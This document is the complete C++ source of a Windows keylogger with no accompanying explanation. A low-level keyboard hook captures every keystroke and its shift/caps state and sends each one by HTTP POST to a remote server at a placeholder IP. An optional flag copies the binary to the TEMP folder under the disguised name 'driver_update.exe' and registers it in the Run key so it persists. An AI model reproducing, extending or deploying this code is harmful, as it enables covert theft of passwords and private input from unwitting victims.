#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <nlohmann/json.hpp>
#include <vector>
#include <fstream>
#include <shlobj.h>


using json = nlohmann::json;

HHOOK hKeyboardHook;
BOOL shiftUpper = FALSE;
BOOL capsUpper = FALSE;

std::vector<std::string> caseArray;
std::vector<std::string> valueArray;

BOOL addToRegistry() {
    char tempPath[MAX_PATH];
    const char* exeName = "\\driver_update.exe";
    const char* valueName = "Driver Update";
    const char* subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    char exeFilePath[MAX_PATH] = "";

    if (GetEnvironmentVariableA("TEMP", tempPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get TEMP path." << std::endl;
        return FALSE;
    }
    
    strcat_s(exeFilePath, tempPath);
    strcat_s(exeFilePath, exeName);

    HKEY hKey;
    LSTATUS openKey = RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_ALL_ACCESS, &hKey);
    if (openKey != ERROR_SUCCESS) {
        std::cerr << "Failed to open reg key. " << GetLastError() << "/n";
        return FALSE;
    }

    LSTATUS status = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)exeFilePath, strlen(exeFilePath) + 1);
    if (status != ERROR_SUCCESS) {
        std::cerr << "Failed to open or set registry.\n";
        RegCloseKey(hKey);
        return FALSE;
    }
    std::cout << "Successfully added value to registry.\n";
    RegCloseKey(hKey);
    return TRUE;
}


BOOL addToTemp() {
    char currentPath[MAX_PATH];
    char dstPath[MAX_PATH];
    const char* dstPathToAppend = "\\";
    const char* dstFileName = "driver_update.exe";
    if (GetEnvironmentVariableA("TEMP", dstPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get TEMP path." << std::endl;
        return FALSE;
    }
    
    strcat_s(dstPath, dstPathToAppend);
    strcat_s(dstPath, dstFileName);


    if (GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get the path of the running program." << std::endl;
        return FALSE;
    }

    if (CopyFileA(currentPath, dstPath, FALSE) == 0) {
        std::cerr << "Failed to copy file to startup.\n" << std::endl;
        std::cerr << "Current path: " << currentPath << "\n";
        std::cerr << "Destination path: " << dstPath << "\n";
        std::cerr << GetLastError();
        return FALSE;
    }
    std::cout << "File successfully saved to " << dstPath;
    return TRUE;
}



BOOL SendRequest() {
    const char* headers = "Content-Type: application/json";
    json jsonData = { 
        {"is_upper",caseArray},
        {"value",valueArray} 
    };
    std::string postData = jsonData.dump();

    HINTERNET hInternet = InternetOpenA(
        NULL,
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );
    if (hInternet == NULL) {

        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
        return FALSE;
    }

    HINTERNET hConnect = InternetConnectA(
        hInternet, 
        "x.x.x.x", // ip
        5000, // port
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0
    );
    if (hConnect == NULL) {
        std::cerr << "InternetConnect failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    HINTERNET hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        "/",
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_RELOAD,
        0
    );

    if (hRequest == NULL) {
        InternetCloseHandle(hInternet);
        InternetCloseHandle(hConnect);
        return FALSE;
    }

    BOOL result = HttpSendRequestA(
        hRequest,
        headers,
        -1,
        (LPVOID)postData.c_str(),
        postData.length()
    );

    InternetCloseHandle(hInternet);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hRequest);

    return TRUE;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYUP) {
            if (pKeyboard->vkCode == 160 || pKeyboard->vkCode == 161) {
                shiftUpper = FALSE;
            }
        }
        
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

            if (pKeyboard->vkCode == 160 || pKeyboard->vkCode == 161) {
                shiftUpper = TRUE;
            }
            else if (pKeyboard->vkCode == 20) {
                capsUpper = !capsUpper;
            }

            std::string value = std::to_string(pKeyboard->vkCode);
            std::string is_upper;
            if (capsUpper && shiftUpper) {
                is_upper = "1"; // Shift
            }
            else if (shiftUpper) {
                is_upper = "1"; // Shift
            }
            else if (capsUpper) {
                is_upper = "2"; // Caps
            }
            else {
                is_upper = "0"; // None
            }

            caseArray.push_back(is_upper);
            valueArray.push_back(value);
            
            if (caseArray.size() > 0) {
                BOOL result = SendRequest();
                if (!result) {
                    std::cerr << "HttpSendRequest failed: " << GetLastError() << std::endl;
                }
                else {
                    std::cout << "POST request sent successfully!" << std::endl;
                }
                caseArray.clear();
                valueArray.clear();
            } 
        }
    }
    
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

int main(int argc, char* argv[]) {
    bool persistence = false;
    if (argc > 1) {
        for (int i = 1; i < argc; ++i) {
            std::string arg = argv[i];

            try {
                if (arg == "-p" || arg == "--persistence") {
                    persistence = true;
                
                }
                else {
                    throw std::runtime_error("Unknown argument: " + arg);
                }
            }

            catch (const std::exception& e) {
                std::cerr << "Error: " << e.what() << std::endl;
                exit(1);
            }
        }
    }
    if (persistence){
        if (!addToRegistry()) {
            return -1;
        }

        if (!addToTemp()) {
            return -1;
        }
    }
    

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!hKeyboardHook) {
        std::cerr << "Failed to install hook.";
        return -1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);

    return 0;
}
